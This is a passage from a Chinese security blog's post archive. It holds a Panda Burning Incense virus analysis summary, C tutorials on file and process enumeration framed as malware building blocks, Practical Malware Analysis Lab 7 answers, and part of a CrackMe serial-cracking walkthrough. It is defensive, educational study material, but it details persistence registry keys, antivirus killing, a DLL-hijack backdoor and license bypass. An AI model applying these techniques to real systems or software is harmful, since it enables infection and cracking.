总结操作2主要是创建了几个线程，sub_40A7EC是用来感染电脑盘符下的可执行文件和网页类型文件，还会在每个文件夹下创建一个desktop.ini写入当前感染的时间。sub_40C5B0每隔6S就会执行一次，遍历所有的盘符，判断盘符根目录下是否存在setup.exe（也就是病毒主体程序）和autorun.inf。sub_40BD08通过网络进行传播，可以看出来熊猫烧香的感染性，传播性确实很强。 操作3进来查看发现创建了四个定时器 分开分析它们 定时1，sub_40CD30函数这个函数每一秒执行一次，进来后首先创建了一个线程，然后是两个对于注册表的操作，先分析一下创建的这个线程。 创建的线程这个线程主要是病毒的一个自我保护，其中关闭了杀毒软件， 还会检测关闭许多的进程，比如说无法打开任务管理器，注册表编辑器。 注册表操作针对注册表操作主要是两个，一个是在HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run中设置键值，实现自启动 另一个是修改SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue键值，实现不显示隐藏文件。 定时2，sub_40CE8C函数这个函数每1200S运行一次（20分钟）。 它首先创建了一个线程 分析此线程，发现其打开了一个URL并且尝试读取一些内容。 并且还有一个执行的操作，猜测应该是从网页中获取到的程序来运行。 定时3，sub_40CE94函数每十秒执行一次。 进来后先创建了两个线程。 第一个线程最终会创建40C964，这个之前已经分析过了 第二个线程40CC38，它是删除了所有的共享文件夹。 定时4，sub_407540函数它每隔6s执行一次，创建了一个线程 这里主要是关闭并删除了一些服务和将一些杀软的启动项删除， 关闭服务 删除服务 删除启动项 总结这里主要是四个功能 第一个是每秒执行关闭杀软和一些其他进程，设置自启动键值和不显示隐藏文件。 第二个每隔20分钟执行一次，会尝试下载资源并运行。 第三个每隔十秒执行一次，删除所有的共享文件夹。 每六秒执行一次，关闭删除服务，并且删除杀软的启动项。 总结到这里整个熊猫烧香就分析完毕了，使用OD结合IDA也分析了比较长的时间，这也算是第一篇正式的一个病毒分析报告，写的可能还是有不成熟的地方，后续还要慢慢改进。","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"熊猫烧香","slug":"熊猫烧香","permalink":"https://b1ackie.cn/tags/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/"}]},{"title":"功能技术-文件遍历","slug":"功能技术-文件遍历","date":"2021-08-17T09:58:04.000Z","updated":"2021-08-18T03:36:45.447Z","comments":true,"path":"2021/08/17/功能技术-文件遍历/","link":"","permalink":"https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/","excerpt":"","text":"文件遍历文件搜索功能是应用程序中最常见的功能之一，同时对于恶意代码来说也是常见的功能，比如勒索病毒就会有大量的文件操作，遍历文件来对文件进行加密。 实现文件遍历的方法有很多，最常见的便是通过API实现，这里主要涉及的是FindFirstFile,FindNextFile以及FindClose等。 函数介绍FindFirstFile在目录中搜索名称与特定名称匹配的文件或者子目录。 1234HANDLE FindFirstFile( LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData); 参数lpFileName：指定目录、路径、以及文件名。文件名可以包括通配符，例如“*”，“？”。此参数不应该为NULL，无效的字符串（例如，空字符串或缺少终止空字符的字符串），尾部以反斜杠（\\）结尾。 如果字符串以通配符、句点“.”或者目录名称结尾，那么用户必须对路径上的根目录和所有子目录具有访问权限。 lpFindFileData：指向WIN32_FIND_DATA结构的指针，用于接收搜索到的文件或者目录的信息。 返回值如果函数成功，则返回值是在后续调用FindNextFile或者FindClose中使用的搜索句柄，lpFindFileData参数包含搜索到的第一个文件或者目录的信息。 如果函数失败或无法从lpFindFileData参数的搜索字符串中找到文件，则返回值为INVALID_HANDLE_VALUE，并且lpFindFileData的内容是不确定的。 FindNextFile继续搜索文件 1234BOOL FindNextFile( HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData); 参数hFindFile：指向前一次调用FindFirstFile或者FindFirstFileEx函数返回的搜索句柄。 lpFindFileData：指向WIN32_FIND_DATA结构的指针，该结构接收搜索到的文件或子目录的信息。 返回值如果函数成功，则返回值不为0，lpFindFileData参数包含搜索到的下一个文件或者目录的信息。如果函数失败，则返回值为0，并且lpFindFileData的内容是不确定的。 WIN32_FIND_DATAA 结构123456789101112131415typedef struct _WIN32_FIND_DATAA &#123; DWORD dwFileAttributes; FILETIME ftCreationTime; FILETIME ftLastAccessTime; FILETIME ftLastWriteTime; DWORD nFileSizeHigh; DWORD nFileSizeLow; DWORD dwReserved0; DWORD dwReserved1; CHAR cFileName[MAX_PATH]; CHAR cAlternateFileName[14]; DWORD dwFileType; DWORD dwCreatorType; WORD wFinderFlags;&#125; WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA; 成员dwFileAttributes：指定文件的文件属性。 ftCreationTime：指定文件或者目录何时创建的FILETIME结构。如果底层文件系统不支持创建时间，则此成员为0。 ftLastAccessTime：对于文件，结构指定文件最后读取、写入或者运行可执行文件的时间。 ftLastWriteTime：对于文件，该结构指定文件上次写入、截断或者覆盖的时间。 nFileSizeHigh：指定文件大小的高阶DWORD值，以字节为单位。 nFileSizeLow：指定文件大小的低阶DWORD值，以字节为单位。 dwReserved0：若dwFileAttributes成员包含FILE_ATTRIBUTE_REPARSE_POINT属性，则此成员将指定重新标记解析点。若此值未定义，则不应该使用。 dwReserved1：保留 cFileName：指向文件的名称。 cAlternateFileName：指向该文件的替代名称。 实现原理文件的搜索功能主要是通过FindFirstFile和FindNextFile这两个函数来实现的。 首先是搜索的路径，假设当前要搜索C盘下所有的文件，那么路径就是”C:\\\\“，指定搜索所有的文件就加上通配符”*“，现在的路径就是”C:\\\\*.*“。 然后就可以调用FindFirstFile函数，进行搜索，搜索的结果保存在WIN32_FIND_DATA结构体指针指向的内存中。结构体中包含文件的各项信息。可以根据成员dwFileAttributes判断文件的属性，若文件属性是FILE_ATTRIBUTE_DIRECTORY，则说明这是一个目录，可以进行再次搜索，但是要注意要过滤掉当前目录“.”和上级目录“..”，根据cFileName获取文件的名称。 之后再调用FindNextFile函数搜索下一个文件即可，重复上述操作，直到根据返回值判断，搜索不到文件。 最后调用FindClose关闭搜索句柄。 编写代码结果太多，为了结果更好展示，将其输出到TXT文件中。搜索时再加入一个判断，只输出exe类型文件。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;void findFile(char* pszPath);int main()&#123; findFile(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop&quot;); system(&quot;pause&quot;); return 0;&#125;void findFile(char* pszPath)&#123; DWORD dwBufferSize = 4096; char* pszFileName = NULL; char* pszNextPath = NULL; WIN32_FIND_DATA FileData = &#123; 0 &#125;; BOOL flag = FALSE; //申请动态内存 pszFileName = new char[dwBufferSize]; pszNextPath = new char[dwBufferSize]; //搜索当前路径下的所有文件 sprintf(pszFileName, &quot;%s\\\\*.*&quot;, pszPath); char ext[_MAX_EXT]; //创建一个TXT文件，将结果输出 FILE* fp; fp = fopen(&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\1.txt&quot;, &quot;a+&quot;); HANDLE hFile = FindFirstFile(pszFileName, &amp;FileData); if (hFile != INVALID_HANDLE_VALUE) &#123; do &#123; //过滤掉当前目录和上级目录 if (!strcmp(FileData.cFileName,&quot;.&quot;) || !strcmp(FileData.cFileName, &quot;..&quot;)) &#123; continue; &#125; //拼接文件路径 sprintf(pszNextPath, &quot;%s\\\\%s&quot;, pszPath, FileData.cFileName); //如果是一个目录的话，继续搜索 if (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) &#123; findFile(pszNextPath); &#125; //不是的话就输出文件名字 else &#123; //分割文件名字 _splitpath(pszNextPath, NULL, NULL, NULL, ext); //判断是否是EXE文件 if (!strcmp(ext, &quot;.exe&quot;)) &#123; printf(&quot;%s\\n&quot;, pszNextPath); //写入文件 fprintf(fp, &quot;%s\\r\\n&quot;, pszNextPath); &#125; &#125; //继续搜索 &#125; while (FindNextFile(hFile, &amp;FileData)); &#125; fclose(fp); FindClose(hFile); delete []pszNextPath; pszNextPath = NULL; delete []pszFileName; pszFileName = NULL;&#125; 测试运行程序，选择遍历的目录为桌面，查看结果可以看到成功输出了当前桌面所有的exe文件（包含子文件夹中的）。 参考《Windows黑客编程技术详解》","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"功能技术","slug":"功能技术","permalink":"https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"}]},{"title":"功能技术-进程遍历","slug":"功能技术-进程遍历","date":"2021-08-17T08:55:11.000Z","updated":"2022-01-12T12:48:13.046Z","comments":true,"path":"2021/08/17/功能技术-进程遍历/","link":"","permalink":"https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/","excerpt":"","text":"进程遍历进程遍历就是遍历当前计算机上所有的进程信息，对于恶意代码来说，可以通过遍历获取进程的信息，可以通过这些信息来判断是否存在指定的进程，比如调试器、杀毒软件。遍历进程的方法有很多，最常用的就是通过进程快照来实现。 函数介绍CreateToolhelp32Snapshot获取指定进程的快照，以及这些进程使用的堆、模块和线程。 1234HANDLE CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID); 参数dwFlags：指定快照中包含的系统内容，这个参数能够使用下列数值中的一个或者多个。 值 含义 THE32CS_INHERIT 声明快照句柄是可继承的 THE32CS_SNAPALL 在快照中包含系统中所有的进程和线程 THE32CS_SNAPHEAPLIST 在快照中包含在the32ProcessID中指定进程的所有堆 THE32CS_SNAPMODULE 在快照中包含在the32ProcessID中指定进程的所有模块 THE32CS_SNAPPROCESS 在快照中包含系统中所有的进程 THE32CS_SNAPTHREAD 在快照中包含系统中所有的线程 th32ProcessID：指定将要快照的进程ID。如果该参数为0，则表示快照当前进程。该参数只有在设置了THE32CS_SNAPHEAPLIST或者THE32CS_SNAPMODULE后才有效，其他情况下应该忽略此参数，快照所有的进程。 返回值若调用成功，则返回快照的句柄；若调用失败，则返回INVALID_HANDLE_VALUE。 Process32First检索系统快照中遇到的第一个进程信息 1234BOOL Process32First( HANDLE hSnapshot, LPPROCESSENTRY32 lppe); 参数hSnapshot：从上次调用CreateToolhelp32Snapshot函数返回的快照句柄。 lppe：指向PROCESSENTRY32结构的指针 。它包含进程信息，例如可执行文件的名称、进程标识符和父进程的进程标识符。 返回值TRUE标识进程列表的第一个条目已经复制到缓冲区，FALSE表示失败。 Process32Next检索有关记录在系统快照中的下一个进程信息。 1234BOOL Process32Next( HANDLE hSnapshot, LPPROCESSENTRY32 lppe); 参数hSnapshot：处理从先前调用CreateToolhelp32Snapshot函数返回的快照句柄 lppe：指向PROCESSENTRY32结构的指针。 返回值如果进程列表的下一个条目已经复制到缓冲区，则返回TRUE；否则返回FALSE。如果不存在任何进程或者快照不包含进程信息，则GetLastError会显示ERROR_NO_MORE_FILES。 实现原理调用CreateToolhelp32Snapshot可以获取当前的进程快照，如果成功便会得到一个进程信息列表，并且返回这个列表的起始索引。然后调用Process32First获取第一个进程信息，进程的信息都保存在PROCESSENTRY32结构体的缓冲区中。若要获取下一个进程信息，就可以调用Process32Next，循环即可获取所有的进程信息。直到Process32Next函数返回值是FALSE，且GetLastError错误代码为ERROR_NO_MORE_FILES，这就表示遍历已经结束了。 编写代码1234567891011121314151617181920212223242526#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;int main()&#123; PROCESSENTRY32 pe = &#123; 0 &#125;; pe.dwSize = sizeof(PROCESSENTRY32); //进程快照 HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcessSnap == INVALID_HANDLE_VALUE) &#123; return -1; &#125; //获取第一个进程信息 BOOL flag = Process32First(hProcessSnap, &amp;pe); while (flag) &#123; printf(&quot;[PID:%d]\\t&quot;, pe.th32ProcessID); printf(&quot;[%s]\\n&quot;, pe.szExeFile); //获取下一个进程信息 flag = Process32Next(hProcessSnap, &amp;pe); &#125; CloseHandle(hProcessSnap); system(&quot;pause&quot;); return 0;&#125; 测试运行查看效果，可以看到可以打印出当前的所有进程信息 反调试功能测试可以通过遍历所有进程来查找是否存在一个调试器，只需要比较一下进程名即可 12345if (!lstrcmp(pe.szExeFile, &quot;吾爱破解[LCG].exe&quot;))&#123; MessageBoxA(NULL, &quot;发现调试器&quot;, &quot;！！！&quot;, NULL); break;&#125; 打开OD，可以看到就会弹窗提示存在调试器。 参考《Windows黑客编程技术详解》","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"功能技术","slug":"功能技术","permalink":"https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"}]},{"title":"恶意代码分析实战-实验7","slug":"恶意代码分析实战-实验7","date":"2021-08-16T06:50:45.000Z","updated":"2021-08-17T06:25:20.814Z","comments":true,"path":"2021/08/16/恶意代码分析实战-实验7/","link":"","permalink":"https://b1ackie.cn/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/","excerpt":"","text":"Lab 7-11.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？创建了一个系统服务来随系统启动，可以看到StartServiceCtrlDispatcherA函数。其中还有一个结构 ServiceStartTable。 1234typedef struct _SERVICE_TABLE_ENTRYA &#123; LPSTR lpServiceName; LPSERVICE_MAIN_FUNCTIONA lpServiceProc;&#125; SERVICE_TABLE_ENTRYA, *LPSERVICE_TABLE_ENTRYA; 这个服务的名称是Malservice，servicemain函数是sub_401040。 2.为什么这个程序会使用一个互斥量？程序创建了一个名为“HGL345”的互斥量。 这是为了防止运行多个程序，首先调用OpenMutexA函数尝试打开名为“HGL345”互斥量句柄，如果已经存在就代表程序已经在运行了，就会退出，如果没有就调用 CreateMutexA创建互斥量。 3.可以用来检测这个程序的基于主机特征是什么？名为”Malservice“的服务或者是”HGL345“互斥量。 4.检测这个恶意代码的基于网络特征是什么？在StartAddress函数中，会有联网的行为，可以看到其中的agent信息和URL。 5.这个程序的目的是什么？首先是创建互斥量防止启动多个。然后是创建一个名为Malservice的服务。然后开始设置时间，将时间设置为了2100年的1月1日0点。 然后调用WaitForSingleObject进入等待，等到前面设置的时间2100年1月1日0点。然后创建二十个同样的线程，来访问http://www.malwareanalysisbook.com 可以理解为一个DDOS的恶意程序。 6.这个程序什么时候完成执行？不会完成执行，到2100年会创建20个线程，但是每个线程都是一个无线循环。 Lab 7-21.这个程序如何完成持久化驻留？这个程序没有持久化驻留，执行一次完成后就会退出。 2.这个程序的目的是什么？程序首先初始化了COM，然后创建了一个COM对象。 其中rclsid的值如下图所示，类标识符，对应的是Internet Explorer。 riid接口标识符对应的是IWebBrowser2。 返回的COM对象保存在ppv中，会调用偏移为0x2C处的函数，而这个函数是Navigate函数，函数调用后，就会打开浏览器浏览“http://www.malwareanalysisbook.com/ad.html”，之后就是一些清理工作。 3.这个程序什么时候完成执行？当执行完访问页面之后就会结束。 Lab 7-3DLL先来分析一下DLL文件 使用IDA打开DLL文件，首先可以看到，尝试打开一个互斥对象，如果不存在就创建一个互斥对象，互斥对象名为SADFHUHF 然后就是SOCKET通信的流程，关于通信的流程可以参考传输技术-SOCKET通信 ，这里地址是127.26.152.13：80，一个本地地址，真实情况肯定不会是一个本地的地址。 发送的信息是hello，然后会关闭这个send连接。 然后是recv函数接收信息，如果收到的信息是sleep就会调用sleep函数。 如果收到的信息是exec就会调用CreateProcessA来启动一个进程。进程是lpCommandLine这个参数。 看这个参数，看到是从第五个字节开始，而我们接收到的命令是exec XXXX，XXXX就是需要启动的进程。这是从远端发送过来的。 到这里基本上DLL就分析完毕了，再来分析一下EXE。 EXE分析一下EXE 要成功执行这个EXE还有一些限制，参数必须为WARNING_THIS_WILL_DESTROY_YOUR_MACHINE才可以执行这个程序。 像这样运行 当满足条件后会开始运行程序，先创建了两个文件，C:\\Windows\\System32\\kerne132.dll（注意这里不是“l”而是“1”）和Lab07-03.dll，还把它们映射到内存中。 再往下的代码比较多也比较复杂，我也没有过多分析，按照书上这部分是在比较内存、写入偏移或者写入内存。直接到后面来分析 在进行完上述操作之后，先关闭句柄，然后复制文件，将Lab07-03.dll复制到C: \\Windows\\System32\\kerne132.dll，如果这个DLL已经存在的话，就不会调用4011E0这个函数，如果不存在复制过后就调用这个函数。 来查看这个函数，它的参数是C:\\*，进来之后它会调用FindFirstFileA和FindNextFileA来遍历所有的文件，然后判断文件类型是否为EXE， 如果是exe的话，就会调用4010A0函数它会将文件映射到内存中，然后调用IsBadReadPtr验证调用进程是否具有对指定内存范围的读取访问权限。 然后检查加载的DLL中是否存在kernel32.dll，如果存在的话就会让kerne132.dll替换它。 打开process monitor监控行为，可以看到大量的文件操作。 打开一个calc.exe查看其加载的DLL，可以看到加载了kerne132.dll。 1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？在计算机中的每个EXE中都植入了一个DLL，相当于一个后门。 2.这个恶意代码的两个明显的基于主机的特征是什么？一个是互斥量SADFHUHF，另一个是在C:\\Windows\\System32\\文件夹下的kerne132.dll。 3.这个程序的目的是什么？搜索所有的EXE文件，并且让它们加载恶意的DLL文件kerne132.dll，这个DLL文件会进行一个SOCKET通信来执行操作，一个操作是sleep，另一个操作是会执行发送过来的进程，可能是恶意进程。 4.一旦这个恶意代码被安装，你如何移除它？如果安装，当前的exe文件都会加载这个恶意的DLL，可以写一个程序遍历所有的exe并且搜索其中的kerne132.dll，然后再用kernel.32替换它，或者复制kernel32.dll为kerne132.dll进行替换。","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"160CrackMe-011","slug":"160CrackMe-011","date":"2021-08-16T06:06:45.000Z","updated":"2021-08-16T06:58:00.766Z","comments":true,"path":"2021/08/16/160CrackMe-011/","link":"","permalink":"https://b1ackie.cn/2021/08/16/160CrackMe-011/","excerpt":"","text":"初探打开程序看到主界面，不可以输入任何字符，只可以点击下面的这个小键盘来进行输入，右边提示一个状态上面写着未注册，猜测成功的话这里应该会发生变化，下面开始分析一下。 分析无壳，使用VB语言编写 使用OD，直接搜索字符串，就可以搜索到一大串类似注册码的字符串和REGISTRIERT。 进入查看，可以看到在关键跳转前有一个比较，猜测应该是输入的内容经过一个计算之后与这个字符串进行比较。 查看栈，可以看到当前输入123456计算出来的注册码 开始寻找一下注册码的生成过程。 在跳转前面下断进行分析，可以看到流程是比较简单的，首先就是获取输入的第一位数字转为浮点数保存起来，然后每一位输入转为ascii码加上这个数字，第一位在前面加上一个0。也就是如果我们输入的是123456，那么我们输入的每一位字符都会加上数字1，也就是注册码第一位是0x31+1=0x32，然后是第一位所以要在前面加上一个0,就是032，第二位就是0x32+1=0x33,现在就是03233，以此类推就会生成前面图片中的字符串，0323334353637。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115004048EB . 52 push edx ; /Step8 = NULL004048EC . 8D4D 9C lea ecx,dword ptr ss:[ebp-0x64] ; |004048EF . 50 push eax ; |/var18 = 005446A4004048F0 . 51 push ecx ; ||retBuffer8 = 00530000004048F1 . 89B5 4CFFFFFF mov dword ptr ss:[ebp-0xB4],esi ; ||msvbvm60.__vbaStrVarVal004048F7 . 89B5 3CFFFFFF mov dword ptr ss:[ebp-0xC4],esi ; ||msvbvm60.__vbaStrVarVal004048FD . FF15 30104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaLenVa&gt;; |\\__vbaLenVar00404903 . 50 push eax ; |End8 = 005446A400404904 . 8D95 3CFFFFFF lea edx,dword ptr ss:[ebp-0xC4] ; |0040490A . 8D85 08FFFFFF lea eax,dword ptr ss:[ebp-0xF8] ; |00404910 . 52 push edx ; |Start8 = NULL00404911 . 8D8D 18FFFFFF lea ecx,dword ptr ss:[ebp-0xE8] ; |00404917 . 50 push eax ; |TMPend8 = 005446A400404918 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24] ; |0040491B . 51 push ecx ; |TMPstep8 = 005300000040491C . 52 push edx ; |Counter8 = NULL0040491D . FF15 38104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaVarFo&gt;; \\__vbaVarForInit00404923 . 8B35 80104000 mov esi,dword ptr ds:[&lt;&amp;MSVBVM60.__vbaSt&gt;; msvbvm60.__vbaStrVarVal00404929 . 8B1D B4104000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM60.#617&gt;] ; msvbvm60.rtcLeftCharVar0040492F &gt; 85C0 test eax,eax00404931 . 0F84 29010000 je Andréna.00404A6000404937 . 8D45 BC lea eax,dword ptr ss:[ebp-0x44]0040493A . 6A 01 push 0x10040493C . 8D4D 8C lea ecx,dword ptr ss:[ebp-0x74]0040493F . 50 push eax00404940 . 51 push ecx00404941 . FFD3 call ebx ; msvbvm60.rtcLeftCharVar00404943 . 8D55 8C lea edx,dword ptr ss:[ebp-0x74]00404946 . 8D45 B0 lea eax,dword ptr ss:[ebp-0x50]00404949 . 52 push edx0040494A . 50 push eax0040494B . FFD6 call esi ; msvbvm60.__vbaStrVarVal0040494D . 50 push eax0040494E . FF15 D8104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#581&gt;] ; 获取第一位数字转为浮点数以便后面计算00404954 . DD9D 34FFFFFF fstp qword ptr ss:[ebp-0xCC]0040495A . 8D4D 9C lea ecx,dword ptr ss:[ebp-0x64]0040495D . 8D55 DC lea edx,dword ptr ss:[ebp-0x24]00404960 . 51 push ecx00404961 . 52 push edx00404962 . C745 A4 01000&gt;mov dword ptr ss:[ebp-0x5C],0x100404969 . C745 9C 02000&gt;mov dword ptr ss:[ebp-0x64],0x200404970 . FF15 AC104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaI4Var&gt;; msvbvm60.__vbaI4Var00404976 . 50 push eax00404977 . 8D45 BC lea eax,dword ptr ss:[ebp-0x44]0040497A . 8D4D B8 lea ecx,dword ptr ss:[ebp-0x48]0040497D . 50 push eax0040497E . 51 push ecx0040497F . FFD6 call esi ; msvbvm60.__vbaStrVarVal00404981 . 50 push eax00404982 . FF15 4C104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#631&gt;] ; msvbvm60.rtcMidCharBstr00404988 . 8BD0 mov edx,eax0040498A . 8D4D B4 lea ecx,dword ptr ss:[ebp-0x4C]0040498D . FF15 BC104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaStrMo&gt;; msvbvm60.__vbaStrMove00404993 . 50 push eax ; /String = &quot;7&quot;00404994 . FF15 20104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#516&gt;] ; \\转为ascii0040499A . 0FBFD0 movsx edx,ax0040499D . 8995 FCFCFFFF mov dword ptr ss:[ebp-0x304],edx004049A3 . C785 7CFFFFFF&gt;mov dword ptr ss:[ebp-0x84],0x5004049AD . DB85 FCFCFFFF fild dword ptr ss:[ebp-0x304]004049B3 . DD9D F4FCFFFF fstp qword ptr ss:[ebp-0x30C]004049B9 . DD85 F4FCFFFF fld qword ptr ss:[ebp-0x30C]004049BF . DC85 34FFFFFF fadd qword ptr ss:[ebp-0xCC] ; 每一位字符ascii码加上第一位数字004049C5 . DD5D 84 fstp qword ptr ss:[ebp-0x7C]004049C8 . DFE0 fstsw ax004049CA . A8 0D test al,0xD004049CC . 0F85 FA1F0000 jnz Andréna.004069CC004049D2 . 8D85 7CFFFFFF lea eax,dword ptr ss:[ebp-0x84]004049D8 . 50 push eax004049D9 . FF15 94104000 call dword ptr ds:[&lt;&amp;MSVBVM60.#572&gt;] ; msvbvm60.rtcHexBstrFromVar004049DF . 8D4D CC lea ecx,dword ptr ss:[ebp-0x34]004049E2 . 8985 74FFFFFF mov dword ptr ss:[ebp-0x8C],eax004049E8 . 8D95 6CFFFFFF lea edx,dword ptr ss:[ebp-0x94]004049EE . 51 push ecx004049EF . 8D85 5CFFFFFF lea eax,dword ptr ss:[ebp-0xA4]004049F5 . 52 push edx004049F6 . 50 push eax004049F7 . C785 6CFFFFFF&gt;mov dword ptr ss:[ebp-0x94],0x800404A01 . FF15 84104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaVarCa&gt;; msvbvm60.__vbaVarCat00404A07 . 8BD0 mov edx,eax00404A09 . 8D4D CC lea ecx,dword ptr ss:[ebp-0x34]00404A0C . FFD7 call edi ; msvbvm60.__vbaVarMove00404A0E . 8D4D B0 lea ecx,dword ptr ss:[ebp-0x50]00404A11 . 8D55 B4 lea edx,dword ptr ss:[ebp-0x4C]00404A14 . 51 push ecx00404A15 . 8D45 B8 lea eax,dword ptr ss:[ebp-0x48]00404A18 . 52 push edx00404A19 . 50 push eax00404A1A . 6A 03 push 0x300404A1C . FF15 9C104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaFreeS&gt;; msvbvm60.__vbaFreeStrList00404A22 . 8D8D 6CFFFFFF lea ecx,dword ptr ss:[ebp-0x94]00404A28 . 8D95 7CFFFFFF lea edx,dword ptr ss:[ebp-0x84]00404A2E . 51 push ecx00404A2F . 8D45 8C lea eax,dword ptr ss:[ebp-0x74]00404A32 . 52 push edx00404A33 . 8D4D 9C lea ecx,dword ptr ss:[ebp-0x64]00404A36 . 50 push eax00404A37 . 51 push ecx00404A38 . 6A 04 push 0x400404A3A . FF15 14104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaFreeV&gt;; msvbvm60.__vbaFreeVarList00404A40 . 83C4 24 add esp,0x2400404A43 . 8D95 08FFFFFF lea edx,dword ptr ss:[ebp-0xF8]00404A49 . 52 push edx ; /TMPend8 = NULL00404A4A . 8D85 18FFFFFF lea eax,dword ptr ss:[ebp-0xE8] ; |00404A50 . 8D4D DC lea ecx,dword ptr ss:[ebp-0x24] ; |00404A53 . 50 push eax ; |TMPstep8 = 005446A400404A54 . 51 push ecx ; |Counter8 = 0053000000404A55 . FF15 C8104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaVarFo&gt;; \\__vbaVarForNext00404A5B .^ E9 CFFEFFFF jmp Andréna.0040492F00404A60 &gt; 8D55 CC lea edx,dword ptr ss:[ebp-0x34]00404A63 . 8D85 4CFFFFFF lea eax,dword ptr ss:[ebp-0xB4]00404A69 . 52 push edx ; /var18 = NULL00404A6A . 50 push eax ; |var28 = 005446A400404A6B . C785 54FFFFFF&gt;mov dword ptr ss:[ebp-0xAC],Andréna.0040&gt;; |0817E747D7AFF7C7F82836D74RR7A7F7E7B7C7D826D81KE7B7C00404A75 . C785 4CFFFFFF&gt;mov dword ptr ss:[ebp-0xB4],0x8008 ; |00404A7F . FF15 5C104000 call dword ptr ds:[&lt;&amp;MSVBVM60.__vbaVarTs&gt;; \\__vbaVarTstEq 继续分析发现问题，最后比较的字符串第一位基本都是081，但是获取的第一位数字最大就是9,最大的9（0x39)+9也才是42，怎么都不会是81。仔细查看发现是自己的思路出现问题了，刚才搜索字符串有许多的地方，而我直接断在第一个地方进行分析，第一个地方只获取第一位数字，而后面会获取前两位数字，这样就对了。 只看这里获取前两位数字的部分即可，其他关键计算与上面是一样的。 12345678910111213004064B3 . 6A 02 push 0x2004064B5 . 8D55 8C lea edx,dword ptr ss:[ebp-0x74]004064B8 . 51 push ecx004064B9 . 52 push edx004064BA . FFD3 call ebx ; msvbvm60.rtcLeftCharVar004064BC . 8D45 8C lea eax,dword ptr ss:[ebp-0x74]004064BF . 8D4D B0 lea ecx,dword ptr ss:[ebp-0x50]004064C2 . 50 push eax004064C3 . 51 push ecx004064C4 . FFD6 call esi ; msvbvm60.__vbaStrVarVal004064C6 . 50 push eax004064C7 . FF15 D8104000 call dword ptr 